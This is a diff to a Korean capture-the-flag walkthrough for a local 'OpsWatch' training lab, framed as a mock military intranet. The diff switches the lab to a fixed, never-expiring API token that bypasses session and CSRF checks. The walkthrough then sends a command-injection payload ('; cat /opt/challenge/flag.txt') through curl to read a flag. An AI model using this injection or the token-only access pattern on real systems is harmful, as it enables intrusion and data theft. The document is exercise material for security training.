@@ -1,10 +1,10 @@
 # OpsWatch 풀이 (스포일러)
 
-대상은 이 저장소의 로컬 실습만입니다.
+대상은 이 저장소의 **가상 국방망 인트라넷 교육 복제**만입니다.
 
 - 베이스 URL: `http://127.0.0.1:8000`
 - 모든 계정·토큰·FLAG는 가짜입니다.
-- 다른 호스트, 공인 주소, 실제 시스템에 같은 요청을 보내지 마세요.
+- 실제 국방망, 다른 호스트, 공인 주소에 같은 요청을 보내지 마세요.
 
 ## 1. 유지보수 ID
 
@@ -19,27 +19,32 @@
 
 로그인 후 `/dashboard/` 에서 시드된 CPU·메모리 카드를 볼 수 있습니다.
 
-## 3. 지원 스크립트 토큰
+## 3. 고정 토큰 발급
 
-`http://127.0.0.1:8000/support/` 에서 `opswatch-healthcheck.sh` 를 받습니다.  
-파일 안에 실습용 토큰이 하드코딩되어 있습니다.
+화면: `http://127.0.0.1:8000/support/`
+
+**토큰 발급**을 누르면 서버가 내부 API 토큰을 돌려줍니다. 사용자별 발급·만료가 아니라 항상 같은 값입니다.
 
 ```
-OPSWATCH_TOKEN="ow-lab-internal-9f3c2a1b7e44"
+GET http://127.0.0.1:8000/api/internal/token/
 ```
 
-주석에 `POST http://127.0.0.1:8000/api/internal/diagnose/` 안내가 있습니다.
+```
+{"token": "ow-lab-internal-9f3c2a1b7e44", "token_type": "internal", "expires_in": null}
+```
 
-## 4. 진단 API 접근
+이 토큰만 있으면 로그인 세션 없이 진단 API를 호출할 수 있습니다.
 
-화면: `http://127.0.0.1:8000/admin/diagnostics/`  
-(Django 관리자 사이트가 아닙니다.)
+## 4. 토큰만으로 진단 API 호출
 
-- 쿠키: 로그인 세션
+화면 `http://127.0.0.1:8000/admin/diagnostics/` 는 로그인이 필요합니다.  
+API `POST /api/internal/diagnose/` 는 세션·CSRF 없이 헤더 토큰만 검사합니다.
+
 - 헤더: `X-OpsWatch-Token: ow-lab-internal-9f3c2a1b7e44`
-- CSRF: 페이지 폼의 `csrfmiddlewaretoken` 또는 쿠키 `csrftoken`
+- 쿠키 없음, CSRF 없음
 
-세션 없이 호출하면 401, 토큰이 없으면 403입니다.
+토큰이 없으면 403입니다.
+
 
 정상 진단 예(컨테이너 내부 `extra_hosts` 기준):
 
@@ -70,15 +75,11 @@ web-01.lab.local; cat /opt/challenge/flag.txt
 FLAG{OPSWATCH_LAB_CMDI_LOCAL_ONLY}
 ```
 
-curl 예시는 세션 쿠키와 CSRF가 필요합니다. 브라우저 진단 화면을 쓰는 것이 실습에 충분합니다.
+세션 없이 토큰만으로 호출하는 예입니다. `127.0.0.1` 전용입니다.
 
 ```powershell
-# 로그인 폼에서 csrftoken + sessionid 를 받은 뒤에만, 그리고 127.0.0.1 에만.
-# 아래는 형식 예시이며, 쿠키 값은 본인 세션으로 교체합니다.
 curl.exe -s -X POST "http://127.0.0.1:8000/api/internal/diagnose/" `
   -H "Content-Type: application/json" `
-  -H "X-CSRFToken: <csrf>" `
   -H "X-OpsWatch-Token: ow-lab-internal-9f3c2a1b7e44" `
-  -H "Cookie: sessionid=<session>; csrftoken=<csrf>" `
   --data "{\"target\":\"web-01.lab.local; cat /opt/challenge/flag.txt\"}"
 ```
